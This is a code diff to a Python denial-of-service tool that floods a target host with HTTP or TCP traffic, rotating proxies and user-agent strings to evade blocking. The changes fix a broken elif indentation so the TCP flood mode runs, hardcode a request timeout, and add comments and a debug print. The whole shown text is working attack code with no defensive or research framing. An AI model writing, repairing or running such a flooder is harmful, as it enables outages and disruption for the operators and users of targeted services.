@@ -53,7 +53,7 @@ def perform_http_flood(target, port, threads, proxy_list, user_agents, timeout, 
                 headers = {"User-Agent": random.choice(user_agents)}
                 proxy = random.choice(proxy_list) if proxy_list else None  # Fix: Using proxy_list instead of undefined variable
                 proxies = {"http": proxy, "https": proxy} if proxy else None
-                response = session.get(f"http://{target}:{port}", headers=headers, proxies=proxies, timeout=timeout)
+                response = session.get(f"http://{target}:{port}", headers=headers, proxies=proxies, timeout=10)
                 analyze_response(response)
             except requests.exceptions.RequestException:
                 print("\033[31m[ERROR] Connection timed out\033[0m")
@@ -110,24 +110,33 @@ def main():
     parser.add_argument("-useragents", "--user-agents", help="Path to user agents file", default="user-agents.txt")
     parser.add_argument("-retry", "--retry", help="Number of retries", type=int, default=3)
     parser.add_argument("-time", "--timeout", help="Request timeout in seconds", type=int, default=5)
-    args = parser.parse_args()
 
+    # Parse the arguments
+    args = parser.parse_args()
+    
+    # Extract arguments from parsed data
     target = args.target
     port = args.port
-    mode = args.mode
+    mode = args.mode  # Ensure this is assigned properly
     threads = args.threads
     proxy_file = args.proxy
     user_agents_path = args.user_agents
     retry = args.retry
     timeout = args.timeout
 
+    # Check if 'mode' was correctly set
+    print(f"Mode: {mode}")  # Debugging line to see if 'mode' is set correctly
+
+    # Ensure user agents file exists
     if not os.path.exists(user_agents_path):
         print(f"\033[31m[ERROR] User agent file {user_agents_path} not found.\033[0m")
         return
 
+    # Read user agents from file
     with open(user_agents_path, "r") as file:
         user_agents = file.read().splitlines()
 
+    # Read proxy list from file if provided
     proxy_list = []
     if proxy_file:
         if not os.path.exists(proxy_file):
@@ -136,11 +145,11 @@ def main():
         with open(proxy_file, "r") as file:
             proxy_list = file.read().splitlines()
 
+    # Run the appropriate flood method based on 'mode'
     if mode == "http":
-        perform_http_flood(target, port, threads, proxy_list, user_agents, timeout, retry)  # Fixed Indentation
-elif mode == "tcp":
+        perform_http_flood(target, port, threads, proxy_list, user_agents, timeout, retry)
+    elif mode == "tcp":
         perform_tcp_flood(target, port, threads, timeout)
-
 
 if __name__ == "__main__":
     main()
